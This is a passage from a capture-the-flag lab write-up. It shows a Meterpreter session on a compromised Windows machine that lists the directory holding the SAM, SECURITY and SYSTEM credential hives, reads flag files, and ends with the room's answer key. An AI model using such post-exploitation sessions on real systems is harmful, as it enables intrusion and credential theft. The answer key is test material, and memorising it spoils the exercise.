                                                             d-001e0bcde3ec}.TMContainer000000
                                                             00000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2009-07-14 08:01:27 +0300  COMPONENTS{016888b9-6c6f-11de-8d1
                                                             d-001e0bcde3ec}.TMContainer000000
                                                             00000000000002.regtrans-ms
100666/rw-rw-rw-  262144    fil   2025-11-24 21:55:00 +0300  DEFAULT
100666/rw-rw-rw-  1024      fil   2011-04-12 11:32:10 +0300  DEFAULT.LOG
100666/rw-rw-rw-  177152    fil   2025-11-24 21:54:59 +0300  DEFAULT.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 05:34:08 +0300  DEFAULT.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-18 01:22:17 +0300  DEFAULT{016888b5-6c6f-11de-8d1d-0
                                                             01e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-18 01:22:17 +0300  DEFAULT{016888b5-6c6f-11de-8d1d-0
                                                             01e0bcde3ec}.TMContainer000000000
                                                             00000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-18 01:22:17 +0300  DEFAULT{016888b5-6c6f-11de-8d1d-0
                                                             01e0bcde3ec}.TMContainer000000000
                                                             00000000002.regtrans-ms
040777/rwxrwxrwx  0         dir   2009-07-14 05:34:57 +0300  Journal
040777/rwxrwxrwx  4096      dir   2025-11-24 21:54:43 +0300  RegBack
100666/rw-rw-rw-  262144    fil   2019-03-17 23:05:08 +0300  SAM
100666/rw-rw-rw-  1024      fil   2011-04-12 11:32:10 +0300  SAM.LOG
100666/rw-rw-rw-  21504     fil   2019-03-18 01:39:12 +0300  SAM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 05:34:08 +0300  SAM.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-18 01:22:17 +0300  SAM{016888c1-6c6f-11de-8d1d-001e0
                                                             bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-18 01:22:17 +0300  SAM{016888c1-6c6f-11de-8d1d-001e0
                                                             bcde3ec}.TMContainer0000000000000
                                                             0000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-18 01:22:17 +0300  SAM{016888c1-6c6f-11de-8d1d-001e0
                                                             bcde3ec}.TMContainer0000000000000
                                                             0000002.regtrans-ms
100666/rw-rw-rw-  262144    fil   2025-11-24 21:36:05 +0300  SECURITY
100666/rw-rw-rw-  1024      fil   2011-04-12 11:32:10 +0300  SECURITY.LOG
100666/rw-rw-rw-  21504     fil   2025-11-24 21:36:05 +0300  SECURITY.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 05:34:08 +0300  SECURITY.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-18 01:22:17 +0300  SECURITY{016888c5-6c6f-11de-8d1d-
                                                             001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-18 01:22:17 +0300  SECURITY{016888c5-6c6f-11de-8d1d-
                                                             001e0bcde3ec}.TMContainer00000000
                                                             000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-18 01:22:17 +0300  SECURITY{016888c5-6c6f-11de-8d1d-
                                                             001e0bcde3ec}.TMContainer00000000
                                                             000000000002.regtrans-ms
100666/rw-rw-rw-  40632320  fil   2025-11-24 23:08:45 +0300  SOFTWARE
100666/rw-rw-rw-  1024      fil   2011-04-12 11:32:10 +0300  SOFTWARE.LOG
100666/rw-rw-rw-  262144    fil   2025-11-24 23:08:45 +0300  SOFTWARE.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 05:34:08 +0300  SOFTWARE.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-18 01:21:19 +0300  SOFTWARE{016888c9-6c6f-11de-8d1d-
                                                             001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-18 01:21:19 +0300  SOFTWARE{016888c9-6c6f-11de-8d1d-
                                                             001e0bcde3ec}.TMContainer00000000
                                                             000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-18 01:21:19 +0300  SOFTWARE{016888c9-6c6f-11de-8d1d-
                                                             001e0bcde3ec}.TMContainer00000000
                                                             000000000002.regtrans-ms
100666/rw-rw-rw-  12582912  fil   2025-11-24 23:07:55 +0300  SYSTEM
100666/rw-rw-rw-  1024      fil   2011-04-12 11:32:06 +0300  SYSTEM.LOG
100666/rw-rw-rw-  262144    fil   2025-11-24 23:07:55 +0300  SYSTEM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 05:34:08 +0300  SYSTEM.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-18 01:21:22 +0300  SYSTEM{016888cd-6c6f-11de-8d1d-00
                                                             1e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-18 01:21:22 +0300  SYSTEM{016888cd-6c6f-11de-8d1d-00
                                                             1e0bcde3ec}.TMContainer0000000000
                                                             0000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-18 01:21:22 +0300  SYSTEM{016888cd-6c6f-11de-8d1d-00
                                                             1e0bcde3ec}.TMContainer0000000000
                                                             0000000002.regtrans-ms
040777/rwxrwxrwx  4096      dir   2018-12-13 02:03:05 +0300  TxR
100666/rw-rw-rw-  34        fil   2019-03-17 22:32:48 +0300  flag2.txt
040777/rwxrwxrwx  4096      dir   2010-11-21 04:41:37 +0200  systemprofile

meterpreter > cat flag2.txt
flag{sam_database_elevated_access}
meterpreter >
```

```bash
meterpreter > cd C:/Users/Jon/Documents
meterpreter > ls
Listing: C:\Users\Jon\Documents
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2018-12-13 06:13:31 +0300  My Music
040777/rwxrwxrwx  0     dir   2018-12-13 06:13:31 +0300  My Pictures
040777/rwxrwxrwx  0     dir   2018-12-13 06:13:31 +0300  My Videos
100666/rw-rw-rw-  402   fil   2018-12-13 06:13:48 +0300  desktop.ini
100666/rw-rw-rw-  37    fil   2019-03-17 22:26:36 +0300  flag3.txt

meterpreter > cat flag3.txt
flag{admin_documents_can_be_valuable}
meterpreter >
```

***Answer the questions below***

***Correct answer: flag{access_the_machine}***

***Correct answer: flag{sam_database_elevated_access}***

***Correct answer: flag{admin_documents_can_be_valuable}***
